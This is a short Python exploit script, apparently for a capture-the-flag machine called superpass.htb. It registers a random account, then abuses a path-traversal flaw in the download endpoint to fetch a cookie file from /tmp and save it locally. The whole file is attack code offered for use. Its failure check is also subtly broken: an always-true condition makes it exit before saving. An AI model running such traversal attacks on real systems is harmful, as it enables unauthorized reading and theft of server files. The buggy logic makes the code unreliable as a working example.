import random

import requests
import os

lfi = "../../../../../../.."
file = "/tmp/stuff/cookie"
url = "http://superpass.htb/download?fn=" + lfi + file


# Login to service
s = requests.Session()
res = s.post("http://superpass.htb/account/register", data={"username": "test"+str(random.randint(0, 999)), "password": "test", "submit": "Login"})
assert "Login failed" not in res.text

# LFI to download file
res = s.get(url)
data = res.content
print(data)

if b"No such" in data or b"read-protected":
    print("[-] Failed to download file")
    exit(1)

# Store in downloads folder
os.makedirs(os.path.dirname("downloads"+file), exist_ok=True)
with open("downloads"+file, "wb") as f:
    f.write(data)